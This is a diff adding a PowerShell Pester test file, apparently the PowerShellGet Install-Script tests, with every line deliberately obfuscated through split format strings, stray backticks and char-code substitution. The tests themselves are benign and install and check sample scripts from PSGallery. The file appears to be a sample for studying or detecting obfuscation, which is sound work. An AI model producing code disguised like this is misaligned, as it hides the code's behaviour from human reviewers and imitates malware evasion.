+        ${OUt`PutP`Ath} = ${scrIp`T:temP`pA`TH}
+        ${g`UiD} =   $qlM::("{2}{0}{1}"-f'e','wguid','n').Invoke().("{1}{0}" -f'string','to').Invoke()
+        ${oUtputf`ilEp`ATh} = &("{2}{0}{1}" -f 'n-Pa','th','Joi') ${o`UtPU`T`pATh} "$guid"
+        ${R`UNspa`Ce} = &("{0}{2}{3}{1}"-f 'C','e','reateRun','Spac') ${oUT`PUtfIlE`PaTH} 1
+
+        
+        ${gLOBAL`:PrO`XY}."ui"."ch`OIcetom`Ake" = 2
+        ${c`OnTEnt} = ${N`Ull}
+
+        try {
+            ${Re`suLT} = &("{2}{3}{1}{0}"-f'and','mm','Ex','ecuteCo') ${ru`NSpA`Ce} ("{4}{11}{1}{7}{10}{9}{12}{2}{3}{6}{0}{8}{5}" -f' -Reposit','ll-Scri','m-Ser','verSc','In','SGallery -Confirm','ript','pt Fab','ory P','k','ri','sta','a')
+        }
+        finally {
+            ${f`IlEn`AMe} = ("{3}{1}{0}{2}{4}{5}" -f'o','romptForCh','i','P','ce-0','.txt')
+            ${PA`TH} = &("{1}{0}{2}"-f'p','join-','ath') ${oUtPu`TFI`LEp`Ath} ${F`i`LEnAME}
+            if (&("{1}{2}{0}" -f 't-Path','T','es') ${p`Ath}) {
+                ${c`o`NteNt} = &("{2}{1}{0}"-f'nt','nte','get-co') ${P`ATh}
+            }
+
+            &("{3}{2}{0}{1}{4}" -f 'seRun','Spa','lo','C','ce') ${runSPA`cE}
+            &("{2}{1}{0}{3}" -f'm','e','R','oveItem') ${o`UT`putfi`l`epATh}
+        }
+
+        ${itE`M`InfO} = &("{1}{2}{0}{3}"-f 'Sc','Fi','nd-','ript') ("{3}{2}{1}{0}{4}"-f 'rS','rve','am-Se','Fabrik','cript') -Repository ("{1}{2}{0}"-f 'ery','PS','Gall')
+
+        ${instal`L`S`HOU`ldproc`ESSMesS`AGE} = ${scRiPT:Lo`ca`Li`z`edDAta}."InSTAllsCRipTW`H`A`TiFme`ssage" -f (${I`T`eMiNfo}."Na`Me", ${I`TEminFO}."veRS`iOn")
+        &("{1}{2}{0}" -f 'rt','Ass','e') (${CO`N`TENT} -and (${c`ont`enT} -match ${INStAl`L`s`H`oulDProCE`Ss`me`SSA`gE})) ('Insta'+'l'+'l '+'s'+'crip'+'t '+'conf'+'irm'+' '+'prom'+'pt '+'is'+' '+'not'+' '+'w'+'orkin'+'g, '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+        ${R`eS} = &("{1}{0}{2}{3}"-f'-In','Get','s','talledScript') ("{4}{3}{0}{2}{1}"-f 'ikam','Script','-Server','br','Fa') -ErrorAction ("{1}{2}{0}{4}{3}"-f 't','Sil','en','e','lyContinu') -WarningAction ("{1}{3}{0}{2}{4}{5}" -f'C','Silen','o','tly','nt','inue')
+        &("{2}{0}{1}"-f 'ert','Null','Ass') ${R`es} ("{0}{10}{13}{7}{9}{5}{1}{4}{8}{2}{14}{3}{6}{12}{11}" -f'I',' a scr','if','Con','i','nstall','firm is ','d no','pt ','t i','nstall-Script s','cepted','not ac','houl',' ')
+    } `
+        -Skip:$((${ps`EdITI`ON} -eq ("{1}{0}" -f 'e','Cor')) -or ( (  gEt-VarIAble  ("ZE"+"NJk") -vaLueo )::"Os`VErsion"."VER`SIon" -lt ("{1}{0}{2}"-f '2','6.2.9','00.0')) -or (${PscU`ltU`RE} -ne ("{0}{1}" -f 'e','n-US')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{2}{9}{8}{6}{7}{5}{3}{0}{1}"-f 'mAndYesToPro','mpt','n','Confir','I','ith','i','ptW','cr','stallS') {
+        ${oUT`PUtPA`TH} = ${sCri`pt:`TE`Mp`PAth}
+        ${g`UID} =  ( gi ("VarIable:"+"Q"+"l"+"m") )."V`AlUE"::("{0}{1}" -f'newgu','id').Invoke().("{2}{0}{1}" -f 'os','tring','t').Invoke()
+        ${O`UT`pUT`FiLEpA`Th} = &("{1}{2}{0}" -f'ath','J','oin-P') ${o`U`TPU`TPATh} "$guid"
+        ${R`UNsP`A`cE} = &("{2}{1}{0}{3}"-f'Ru','ate','Cre','nSpace') ${OuT`Putf`ILEp`AtH} 1
+
+        
+        ${GloBAl`:`p`R`OXY}."Ui"."Cho`IC`EtomA`Ke" = 0
+        ${c`oN`TEnT} = ${N`UlL}
+
+        try {
+            ${reS`ULT} = &("{1}{0}{2}{4}{3}"-f 'x','E','e','mand','cuteCom') ${RuN`sP`AcE} ((("{6}{8}{7}{0}{4}{9}{14}{1}{11}{12}{10}{5}{13}{2}{3}"-f 'r','er','-Script -','Confirm','ikam','l','Find-Scrip','ab','t F','-S','pt {0} Insta','Scr','i','l','erv'))  -f [char]124)
+        }
+        finally {
+            ${Fi`LE`NaME} = ("{0}{3}{4}{2}{1}{5}"-f 'Pr','x','hoice-0.t','omptF','orC','t')
+            ${Pa`TH} = &("{1}{2}{0}{3}" -f 'n-pa','jo','i','th') ${OUTpUT`F`I`l`ePath} ${f`il`EnAme}
+            if (&("{1}{0}{2}" -f'-Pat','Test','h') ${P`ATH}) {
+                ${cOnt`E`Nt} = &("{0}{1}{2}"-f'g','et-con','tent') ${Pa`Th}
+            }
+
+            &("{3}{0}{1}{2}" -f'se','RunSp','ace','Clo') ${r`UnSP`AcE}
+            &("{0}{2}{1}"-f'Remo','Item','ve') ${OutpUtFil`E`p`ATH}
+        }
+
+        ${I`TemIN`Fo} = &("{0}{1}{2}"-f'F','ind-','Script') ("{3}{4}{0}{1}{2}{5}{6}"-f'ika','m','-Serv','Fa','br','erScri','pt') -Repository ("{0}{1}" -f'PSGal','lery')
+
+        ${in`sTa`Ll`shouL`DP`Roc`EsSm`Ess`AGe} = ${ScRIPT:loCAli`Z`ed`da`Ta}."INstAlLSC`R`Ip`TW`h`AT`I`FmESsaGE" -f (${IT`eM`inFo}."Na`mE", ${itE`m`infO}."Ve`R`SIon")
+        &("{0}{2}{1}"-f 'As','t','ser') (${c`OnTeNt} -and (${cont`e`Nt} -match ${iNsta`L`L`S`HO`ULdPROcEssMEs`s`AGe})) ('Inst'+'all'+' '+'scrip'+'t '+'c'+'onfir'+'m '+'p'+'r'+'ompt '+'is'+' '+'not'+' '+'wo'+'rkin'+'g, '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+        ${R`ES} = &("{0}{1}{3}{2}" -f'Get-Ins','t','cript','alledS') ("{2}{0}{5}{4}{3}{1}"-f 'a','rverScript','F','e','ikam-S','br')
+        &("{1}{0}{2}{3}"-f'sertEqu','As','al','s') ${r`ES}."N`AME" ("{0}{2}{4}{1}{3}"-f 'Fa','am-ServerScri','bri','pt','k') ('Install'+'-'+'Script '+'sh'+'o'+'uld '+'insta'+'ll'+' '+'a '+'s'+'cript '+'i'+'f '+'Confirm'+' '+'is'+' '+'ac'+'c'+'ept'+'ed, '+"$res")
+    } `
+        -Skip:$((${pSEd`IT`ioN} -eq ("{1}{0}"-f'e','Cor')) -or ( (Gi  vAriAbLe:ZeNJk)."VaL`UE"::"OSve`Rs`Ion"."ve`RSIOn" -lt ("{0}{2}{1}"-f '6.','200.0','2.9')) -or (${pSc`U`LTure} -ne ("{1}{0}"-f'-US','en')))
+
+    
+    &('It') ("{0}{3}{8}{4}{6}{1}{7}{5}{2}{9}" -f 'Val','stalle','Cmdl','id','t','pt','eGetIn','dScri','a','et') {
+
+        ${se`RvE`R`scrIPtnA`mE} = ("{0}{4}{5}{6}{3}{2}{1}" -f 'Fa','t','crip','rverS','b','r','ikam-Se')
+        ${C`li`EN`TsCRIPtName} = ("{3}{0}{1}{2}{4}"-f 'ika','m-ClientScr','i','Fabr','pt')
+
+        &("{3}{1}{0}{2}{4}"-f'all-S','t','cr','Ins','ipt') -Name ${CLI`e`N`TS`cRiPTNAMe}
+        ${r`es} = &("{4}{5}{3}{0}{1}{2}"-f 'a','lled','Script','st','Get-I','n') -Name ${ClieN`Ts`cRi`Ptna`me}
+        &("{2}{1}{3}{0}"-f's','ertE','Ass','qual') ${R`es}."nA`ME" ${c`LIEn`TScRi`P`T`Name} ('Get-In'+'stall'+'edSc'+'ri'+'pt '+'re'+'su'+'lts '+'are'+' '+'n'+'ot '+'e'+'xpe'+'cted,'+' '+"$res")
+
+        &("{2}{1}{0}{4}{3}" -f'tal','s','In','t','l-Scrip') -Name ${sER`Ve`Rs`cRIp`TnA`Me} -RequiredVersion 1.0 -Force
+        ${Sc`RIPT`S1} = &("{1}{0}{4}{2}{3}"-f't-Ins','Ge','dScrip','t','talle')
+        &("{0}{1}" -f'As','sert') (${SC`RipT`s1}."COU`Nt" -ge 2) ("{1}{0}{6}{8}{4}{5}{3}{2}{7}" -f't-InstalledScri','Ge','l','er','r','op','pt is no','y','t working p')
+
+        ${r`es} = &("{3}{0}{2}{1}" -f 'nsta','t','lledScrip','Get-I') -Name ${s`E`RV`eRSCRIpTname}
+        &("{2}{1}{0}" -f's','l','AssertEqua') ${R`ES}."n`AMe" ${sE`RV`ERsC`R`ipTnA`mE} ('Ge'+'t-Insta'+'l'+'le'+'dSc'+'ript '+'retur'+'ned'+' '+'wrong'+' '+'script'+', '+"$res")
+        &("{3}{1}{0}{2}"-f 't','sser','Equals','A') ${r`ES}."vE`RS`Ion" "1.0" ('Get-In'+'st'+'alledS'+'c'+'ri'+'pt '+'retur'+'ne'+'d'+' '+'wrong'+' '+'scr'+'i'+'pt '+'versio'+'n'+', '+"$res")
+
+        &("{1}{0}{2}{3}"-f 'S','Update-','cr','ipt') -Name ${SeR`V`eRScRi`PTN`AME} -RequiredVersion 2.0
+        ${Re`S2} = &("{0}{2}{4}{3}{1}"-f'G','ledScript','e','l','t-Insta') -Name ${se`RV`Er`SCrIPtNa`Me} -RequiredVersion "2.0"
+        &("{2}{3}{0}{1}"-f 'u','als','A','ssertEq') ${re`S2}."na`ME" ${seR`V`ErsCri`pT`NAme} ('Get-'+'In'+'st'+'alled'+'Script '+'retur'+'ned '+'wr'+'ong '+'sc'+'ript '+'af'+'ter '+'Up'+'date-Sc'+'r'+'ipt,'+' '+"$res2")
+        &("{1}{2}{0}"-f 'quals','Assert','E') ${Re`S2}."VeR`SIOn" "2.0"  ('Get-I'+'n'+'s'+'talledScri'+'pt '+'re'+'t'+'u'+'rned '+'wro'+'n'+'g '+'scri'+'p'+'t '+'ver'+'sion '+' '+'a'+'ft'+'er '+'Updat'+'e'+'-Sc'+'ri'+'pt, '+"$res2")
+
+        ${ScRi`p`TS2} = &("{1}{4}{3}{0}{2}" -f 'c','Get-Inst','ript','edS','all')
+        &("{3}{2}{1}{0}" -f 'als','tEqu','er','Ass') ${sc`R`ipTS1}."cOU`Nt" ${S`cRIpts2}."COU`Nt" "script count should be same before and after updating a script, before: $($scripts1.count), after: $($scripts2.count) "
+    }
+}
+
+&("{2}{0}{1}" -f'escrib','e','D') ("{5}{0}{1}{8}{7}{6}{9}{3}{2}{4}" -f'rShell.PS','Get.I','rip','c','tTests.P1','Powe','l','a','nst','lS') -Tags 'P1', ("{0}{2}{1}" -f 'Out','oop','erL') {
+
+    
+    
+    if (${i`S`macoS}) {
+        return
+    }
+
+    &("{0}{1}{2}"-f 'B','efo','reAll') {
+        &("{0}{1}{2}"-f 'S','uiteSet','up')
+    }
+
+    &("{2}{0}{1}"-f'te','rAll','Af') {
+        &("{1}{3}{0}{2}" -f'it','S','eCleanup','u')
+    }
+
+    &("{1}{2}{0}" -f'ch','Af','terEa') {
+        &("{4}{3}{2}{0}{1}" -f 'i','pt','edScr','t-Install','Ge') -Name ("{0}{4}{1}{3}{2}"-f 'Fabr','m','ript','-Sc','ika') -ErrorAction ("{1}{0}{2}{4}{3}"-f'le','Si','ntlyContin','e','u') | &("{0}{1}{2}{3}{4}" -f'U','ninstall','-','Scrip','t') -Force
+        &("{2}{4}{1}{3}{0}{5}" -f'lledScr','t','Get-In','a','s','ipt') -Name ("{3}{0}{5}{1}{4}{2}"-f'br','-S','erScript','Fa','erv','ikam') -ErrorAction ("{0}{3}{1}{2}" -f 'Si','yContin','ue','lentl') | &("{2}{1}{0}" -f 'cript','tall-S','Unins') -Force
+        &("{4}{5}{0}{3}{2}{1}"-f'n','t','Scrip','stalled','Get-','I') -Name ("{0}{2}{3}{1}"-f 'Fabrik','ript','a','m-ClientSc') -ErrorAction ("{0}{1}{2}{3}"-f 'SilentlyCo','ntin','u','e') | &("{4}{2}{1}{3}{0}"-f't','r','Sc','ip','Uninstall-') -Force
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{3}{2}{1}{4}{7}{6}{0}{5}" -f'WildCa','llScript','nsta','I','WithP','rd','ix','ref') {
+        &("{4}{3}{0}{5}{1}{2}"-f'a','r','IdEquals','yQu','AssertFull','lifiedErro') -scriptblock { &("{0}{1}{2}"-f 'Inst','all-Scr','ipt') ("{5}{4}{0}{1}{3}{2}" -f 'erv','e','t','rScrip','kam-S','*') } `
+            -expectedFullyQualifiedErrorId ("{2}{9}{10}{0}{7}{5}{3}{8}{4}{6}{1}" -f 'ldNotCon','ript','N','rdChar','r','inWildca','s,Install-Sc','ta','acte','ame','Shou')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{2}{4}{8}{5}{1}{3}{6}{7}" -f 'Install','stf','Scr','i','ipt','o','xWildCar','d','WithP') {
+        &("{1}{5}{4}{0}{2}{3}"-f 'iedE','Asse','r','rorIdEquals','alif','rtFullyQu') -scriptblock { &("{2}{1}{0}"-f'll-Script','nsta','I') ("{0}{4}{2}{5}{1}{3}" -f'Fab','erverScr','ik','i*','r','am-S') } `
+            -expectedFullyQualifiedErrorId ("{5}{9}{0}{11}{4}{1}{13}{6}{10}{12}{2}{3}{7}{8}"-f'o','o','rdCharacte','rs,','dN','Nam','on','I','nstall-Script','eSh','tain','ul','Wildca','tC')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{7}{6}{5}{3}{2}{4}{1}"-f'InstallScriptWith','s','Car','d','d','l','i','W') {
+        &("{2}{0}{1}{4}{3}{5}"-f 'ssertFully','Qualif','A','ErrorIdEqu','ied','als') -scriptblock { &("{1}{2}{0}{3}"-f'al','In','st','l-Script') ("{5}{6}{0}{1}{2}{4}{3}" -f'v','er','Scr','p*','i','*a','brikam-Ser') } `
+            -expectedFullyQualifiedErrorId ("{11}{4}{7}{10}{12}{13}{9}{1}{5}{8}{2}{3}{0}{6}"-f 'l-Scr','ldcardCha','n','stal','h','racter','ipt','o','s,I','ontainWi','uld','NameS','No','tC')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{3}{4}{7}{0}{2}{6}{5}{1}" -f 'rip','rams','tWithVersion','Inst','all','a','P','Sc') {
+        &("{8}{5}{7}{4}{0}{6}{1}{9}{3}{2}" -f 'a','if','s','orIdEqual','rtFullyQu','ss','l','e','A','iedErr') -scriptblock { &("{2}{3}{0}{1}" -f 'tall-Scrip','t','I','ns') ("{2}{0}{3}{4}{5}{1}"-f'ab','ript','F','r','ikam-Serv','erSc') -MinimumVersion 1.0 -RequiredVersion 5.0 } `
+            -expectedFullyQualifiedErrorId ("{5}{0}{8}{2}{12}{7}{3}{9}{6}{11}{1}{10}{4}{13}"-f's','Inst','AndRequiredVersi','tBeSpecif','Scrip','Ver','d','Canno','ionRange','ie','all-','Together,','on','t')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{7}{5}{6}{8}{0}{4}{2}{1}{9}{3}"-f'e','rs','ithReqVe','n','sW','stallMu','lt','In','ipleNam','io') {
+        &("{1}{8}{2}{7}{6}{3}{9}{4}{0}{5}"-f 'al','Asse','u','ror','u','s','r','llyQualifiedE','rtF','IdEq') -scriptblock { &("{2}{0}{1}"-f 'Scrip','t','Install-') ("{2}{5}{0}{4}{3}{1}" -f 'm-Cl','t','F','crip','ientS','abrika'), ("{4}{1}{2}{5}{3}{0}" -f'ript','b','rikam-S','erSc','Fa','erv') -RequiredVersion 2.0 } `
+            -expectedFullyQualifiedErrorId ("{2}{10}{8}{7}{3}{9}{1}{6}{4}{5}{0}"-f'ipt','thSingl','V','tersAreA','ame,I','nstall-Scr','eN','Parame','ion','llowedOnlyWi','ers')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{4}{0}{3}{1}{2}" -f'ul','Mi','nVersion','tipleNamesWith','lM','Instal') {
+        &("{2}{5}{3}{1}{6}{4}{0}" -f'als','fiedErrorId','Ass','Quali','qu','ertFully','E') -scriptblock { &("{1}{3}{0}{2}" -f'l','I','l-Script','nsta') ("{1}{0}{5}{2}{4}{3}"-f'ab','F','i','entScript','kam-Cli','r'), ("{0}{2}{3}{1}"-f'Fabrikam-','ript','S','erverSc') -MinimumVersion 2.0 } `
+            -expectedFullyQualifiedErrorId ("{1}{9}{7}{11}{5}{15}{10}{13}{6}{0}{8}{2}{4}{12}{3}{14}"-f'lyWith','V','ingl','sta','eName,I','r','On','onParam','S','ersi','Allow','etersA','n','ed','ll-Script','e')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{8}{7}{0}{6}{1}{11}{10}{9}{4}{2}{3}"-f'Req','er','n','stalled','eadyI','I','V','criptShouldFailIf','nstallS','r','NotAl','sion') {
+        ${S`Cr`IP`TNAme} = ("{2}{0}{1}{3}"-f 'am-Server','Scri','Fabrik','pt')
+        ${v`ers`IoN} = '1.5'
+        &("{3}{4}{1}{2}{0}" -f 't','cri','p','In','stall-S') ${sC`RIP`TNaMe} -RequiredVersion ${vE`Rs`IoN}
+        ${I`Nst`AlLeDScriP`T`InFO} = &("{0}{3}{4}{1}{2}"-f 'Ge','talledS','cript','t-','Ins') -Name ${Scr`i`PTname} -RequiredVersion ${V`e`RsiOn}
+        ${WV} = ${NU`Ll}
+        &("{2}{0}{3}{1}" -f's','all-Script','In','t') ${SCR`iptNa`mE} -RequiredVersion 2.0 -WarningAction ("{1}{2}{3}{0}{4}"-f'ontin','S','ilen','tlyC','ue') -WarningVariable ('wv')
+
+        ${mesS`AGE} = ${s`CR`IpT`:lo`cAli`Zed`DaTA}."s`cRI`Pt`A`LrEAdY`i`NStaLlEd" -f (${I`NstAL`LEdscR`IPTi`NfO}."VerSI`on",
+            ${insTa`LlEDscRip`T`I`NFo}."NA`me",
+            ${i`N`sTA`lLe`dsCriPtIN`FO}."inst`ALl`e`DLoCaTion",
+            ${InstaLle`dSc`RIp`T`inFO}."v`E`RSiON",
+            '2.0')
+        
+        if (${pSVeRSI`on`Ta`Ble}."pSv`E`RsIoN" -ge ("{1}{0}"-f '.0.0','5')) {
+            &("{4}{5}{3}{1}{2}{0}{6}" -f'ensitiv','qual','sCaseIns','sertE','A','s','e') ${WV}."mEs`S`Age" ${MEs`SAge} ("{12}{2}{18}{20}{8}{1}{14}{0}{11}{10}{15}{7}{4}{3}{13}{21}{19}{17}{5}{9}{6}{16}" -f'ot ','ou','tall','i','script ','y','stall',' ','h',' in','nstal','re-i','Ins','f it i','ld n','l a','ed','d','-S','alrea','cript s','s ')
+        }
+    } `
+        -Skip:$(${p`S`c`ULTuRe} -ne ("{0}{1}" -f 'en-U','S'))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{10}{5}{0}{9}{3}{2}{13}{6}{1}{4}{8}{12}{7}{11}" -f'tallScriptShoul','otAlre','ilIfMin','Fa','ad','ns','sionN','sta','yI','d','I','lled','n','Ver') {
+        ${scrip`T`Name} = ("{0}{3}{1}{2}" -f 'Fabrikam-Serve','S','cript','r')
+        ${v`Ers`ION} = '1.5'
+        &("{0}{2}{1}" -f'Inst','ipt','all-Scr') ${s`cRipT`N`AME} -RequiredVersion ${V`eRSION}
+        ${i`NStaL`LeDscR`iptInfo} = &("{1}{3}{0}{4}{2}" -f'all','G','cript','et-Inst','edS') -Name ${s`CRIpt`NA`me} -RequiredVersion ${VEr`Si`On}
+        ${W`V} = ${n`ULl}
+        &("{1}{0}{3}{2}"-f'all-','Inst','pt','Scri') ${s`CRI`PTNAME} -MinimumVersion 2.0 -WarningAction ("{1}{0}{2}" -f 'le','Si','ntlyContinue') -WarningVariable ('wv')
+
+        ${Mes`sa`gE} = ${S`Cr`ipT:L`oCaliZ`e`DData}."s`CRIPtA`LR`eADY`iNstAl`l`eD" -f (${in`StALledS`cRi`PTi`Nfo}."v`e`RSIOn",
+            ${iNS`Tal`leD`scrIPTInFO}."nA`me",
+            ${I`N`sT`AL`lEdscRiPt`INFO}."iNS`Ta`lLEdLoCATi`ON",
+            ${InST`AlL`EdscriPt`In`FO}."V`ErSION",
+            '2.0')
+        &("{1}{2}{0}"-f 'rt','Ass','e') (${mEss`A`Ge} -match ${SCRiPt`Na`me}) "Install-Script should not re-install a script if it is already installed, $($wv.Message) "
+    } `
+        -Skip:$(${P`sCULTu`Re} -ne ("{0}{1}" -f'en-U','S'))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{16}{11}{2}{12}{4}{7}{14}{8}{18}{1}{17}{9}{15}{13}{0}{10}{3}{6}" -f 'A','mptF','e_','ari','ript_AllUser','Install','able','s_N','ThePr','Addi','THV','g','Sc','P','O_to','ngto','Packa','or','o') {
+        try {
+            
+            &("{0}{1}{2}"-f'Rem','ove','Item') -Path ${scriP`T:ps`geTSE`TT`ings`FiLEP`ATH}
+
+            
+            &("{5}{7}{6}{1}{4}{2}{3}{0}" -f'n','a','Lo','catio','ll','Res','criptsInst','et-PATHVariableForS') -Scope ("{1}{0}{2}" -f 'e','AllUs','rs')
+
+            ${n`UlL} = &(("{3}{4}{10}{9}{0}{6}{7}{1}{12}{5}{11}{2}{8}"-f 'a','T','kageProv','Pac','ka','ort-','nagemen','tj','ider','eM','g','Pac','3Imp'))."RePlA`Ce"(([char]106+[char]84+[char]51),[StRINg][char]92) -Name ("{0}{1}{3}{2}"-f'Po','werShell','t','Ge') -Force
+
+            ${OU`Tp`UtpaTh} = ${sC`RIpt:Te`Mp`pA`TH}
+            ${g`UId} =  (DIR ("VArI"+"Ab"+"Le:qlm"))."va`luE"::("{1}{0}" -f'd','newgui').Invoke().("{0}{2}{1}" -f 'tostr','ng','i').Invoke()
+            ${ou`T`PUTfi`lEPa`TH} = &("{2}{1}{0}"-f 'h','n-Pat','Joi') ${O`Ut`PutP`AtH} "$guid"
+            ${R`UN`SpAcE} = &("{1}{3}{2}{0}" -f 'eRunSpace','C','at','re') ${o`UTpu`T`FIlePatH} 1
+
+            
+            ${GlObA`l`:PrO`xy}."uI"."C`hoIC`EtoMA`Ke" = 1
+
+            ${C`onTE`NT} = ${N`Ull}
+
+            try {
+                ${R`esUlt} = &("{1}{2}{0}" -f'mmand','Execute','Co') ${rUnSPA`ce} ("{11}{4}{0}{5}{8}{12}{18}{15}{16}{10}{20}{2}{3}{9}{22}{6}{19}{21}{14}{1}{7}{17}{13}" -f'ackage -Provider P',' -Sour','ame',' ','l-P','o','ikam-S','c','w','Fab','ript ','Instal','erShe','allery','pt','et -','Type Sc','e PSG','llG','erv','-N','erScri','r')
+            }
+            finally {
+                ${Fi`l`EnaME} = ("{5}{0}{2}{4}{1}{3}"-f'om','.t','ptFor','xt','Choice-0','Pr')
+                ${Pa`TH} = &("{2}{1}{0}"-f'path','n-','joi') ${o`UTPUtFIl`ePAth} ${F`ILe`NAMe}
+                if (&("{1}{0}{3}{2}"-f'st-Pa','Te','h','t') ${p`ATh}) {
+                    ${CON`T`ENt} = &("{1}{2}{0}"-f'ent','get-','cont') ${p`AtH}
+                }
+
+                &("{0}{1}{2}{3}"-f 'Clo','seRunS','p','ace') ${R`UnsP`AcE}
+                &("{0}{1}{2}" -f'Remove','I','tem') ${OU`Tp`UTFIL`EpATh}
+            }
+
+            ${INsT`A`lLsh`ouldP`Ro`Ce`s`SM`eSSAge} = ${scrIPt:`LoCa`L`iZeD`DATA}."s`CrIPTp`AT`H`PR`OMPtqUErY" -f (${Sc`Ri`pt:PRograM`F`iL`E`S`sCrIptSpaTh})
+            &("{2}{0}{1}"-f 'e','rt','Ass') (${cONtE`NT} -and (${CO`NtenT} -eq ${i`NSt`AlL`S`hOu`Ld`pRocesSMESSaGE})) ('I'+'nsta'+'ll '+'sc'+'rip'+'t '+'prom'+'pt '+'for'+' '+'add'+'ing '+'to'+' '+'P'+'ATH '+'va'+'riable'+' '+'is'+' '+'not'+' '+'work'+'ing,'+' '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+            ${R`ES} = &("{2}{3}{4}{5}{0}{1}" -f'edScrip','t','Ge','t-I','nsta','ll') ("{4}{2}{1}{5}{6}{0}{3}"-f 'cri','Se','brikam-','pt','Fa','rver','S')
+            &("{2}{0}{1}"-f'se','rtEquals','As') ${R`es}."nA`mE" ("{6}{2}{3}{0}{4}{5}{1}" -f'erS','ipt','m-Ser','v','c','r','Fabrika') ('Install-'+'Sc'+'ri'+'pt '+'sho'+'u'+'ld '+'inst'+'a'+'ll '+'a '+'sc'+'rip'+'t '+'eve'+'n '+'when'+' '+'prom'+'pt '+'is'+' '+'no'+'t '+'acc'+'ep'+'ted, '+"$res")
+        }
+        finally {
+            
+            &("{10}{2}{4}{12}{0}{6}{5}{8}{3}{11}{7}{9}{1}" -f 'a','ation','-P','le','ATH','ia','r','iptsInstall','b','Loc','Set','ForScr','V') -Scope ("{2}{0}{1}"-f 'lUs','ers','Al')
+
+            &("{4}{2}{3}{1}{0}" -f 'ript','alledSc','et-','Inst','G') -Name ("{1}{2}{0}{3}"-f'erverScr','Fab','rikam-S','ipt') -ErrorAction ("{1}{2}{3}{0}"-f 'e','Silen','tlyConti','nu') | &("{1}{0}{4}{3}{2}" -f'nstal','Uni','ipt','r','l-Sc') -Force
+        }
+    } `
+        -Skip:$((${Pse`dItI`oN} -eq ("{1}{0}"-f 're','Co')) -or ( (  Get-iteM  ('vA'+'rI'+'ABLe:ze'+'NjK'))."V`AluE"::"o`SVErs`ION"."ve`RSi`oN" -lt ("{1}{0}{2}"-f'.9','6.2','200.0')) -or (${Psc`UL`TURe} -ne ("{0}{1}"-f 'en-','US')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{9}{5}{16}{14}{1}{10}{6}{3}{2}{15}{0}{13}{12}{8}{7}{11}{17}{18}" -f'_YE','_Sc','Use','All','Ins','a','_','in','rAdd','tallP','ript','gto','o','S_toThePromptF','age','rs','ck','P','ATHVariable') {
+        try {
+            
+            &("{1}{2}{0}" -f'Item','R','emove') -Path ${sc`Ri`PT:pSGEtSetTI`Ngs`FilEPa`TH}
+
+            
+            &("{2}{6}{5}{7}{0}{3}{4}{8}{1}" -f'able','ation','Re','F','orScriptsInstallLo','TH','set-PA','Vari','c') -Scope ("{0}{2}{1}"-f 'Al','ers','lUs')
+
+            ${n`Ull} = &((("{6}{5}{9}{10}{2}{3}{13}{4}{7}{0}{11}{8}{1}{12}" -f'Import-Pack','ovi','em','en','5','ka','Pac','T','Pr','g','eManag','age','der','t6')) -RePlACe ([ChAr]54+[ChAr]53+[ChAr]84),[ChAr]92) -Name ("{1}{0}{2}"-f'owerShe','P','llGet') -Force
+
+            ${OuTpU`T`Path} = ${ScripT:`TemPpa`Th}
+            ${g`UiD} =  (  geT-VaRIABLE  qlm )."VA`LuE"::("{1}{2}{0}" -f'uid','n','ewg').Invoke().("{1}{0}" -f 'string','to').Invoke()
+            ${O`UT`Put`FIlEpaTh} = &("{0}{1}{2}"-f 'Join-','Pa','th') ${OuTPUt`p`AtH} "$guid"
+            ${r`Un`SPaCe} = &("{4}{2}{3}{0}{1}"-f 'unSpa','ce','eate','R','Cr') ${OuTpUTfil`epa`TH} 1
+
+            
+            ${G`LoBAl:`p`R`OXy}."U`I"."choi`cEtO`MA`Ke" = 0
+
+            ${CO`Nte`NT} = ${NU`Ll}
+
+            try {
+                ${Res`U`LT} = &("{3}{1}{0}{2}"-f'ut','c','eCommand','Exe') ${r`U`NSp`Ace} ("{16}{4}{11}{13}{10}{14}{24}{22}{12}{7}{9}{25}{18}{8}{5}{6}{15}{20}{23}{1}{17}{21}{0}{3}{26}{2}{19}"-f 'our','Scr','e','ce PSGal','a','-Name',' F','et -','pt ','Type','Package -Provide','l','ellG','l-','r Power','ab','Inst','ipt','ri','ry','rikam-',' -S','h','Server','S',' Sc','l')
+            }
+            finally {
+                ${FIl`En`AmE} = ("{6}{0}{3}{4}{5}{1}{2}"-f 'rom','tx','t','ptF','orChoi','ce-0.','P')
+                ${p`ATH} = &("{2}{1}{0}" -f 'h','t','join-pa') ${oU`TPutFIle`pa`TH} ${Fi`lEn`AMe}
+                if (&("{0}{2}{1}"-f'T','ath','est-P') ${p`AtH}) {
+                    ${cON`T`enT} = &("{3}{1}{2}{0}" -f't','et-cont','en','g') ${PA`Th}
+                }
+
+                &("{1}{2}{0}"-f 'seRunSpace','Cl','o') ${RuN`SPA`cE}
+                &("{2}{1}{0}"-f'veItem','mo','Re') ${OuT`p`Utfil`EPAtH}
+            }
+
+            ${INs`TA`lLS`HOuLdprOcESSmes`Sage} = ${SCrIp`T`:Lo`CAl`IZEdd`AtA}."SC`RIptP`A`T`Hp`ROmPt`quErY" -f (${SCr`ipT`:PrOgram`FilE`sSCR`i`P`TSPATh})
+            &("{0}{1}"-f'Asse','rt') (${Co`NTe`Nt} -and (${contE`Nt} -eq ${InsTa`llsHOUL`DP`ROcEssM`Es`S`AGe})) ('I'+'nst'+'all '+'s'+'crip'+'t '+'prom'+'pt '+'f'+'or '+'ad'+'ding'+' '+'t'+'o '+'PAT'+'H '+'vari'+'a'+'ble '+'is'+' '+'no'+'t '+'worki'+'ng'+', '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
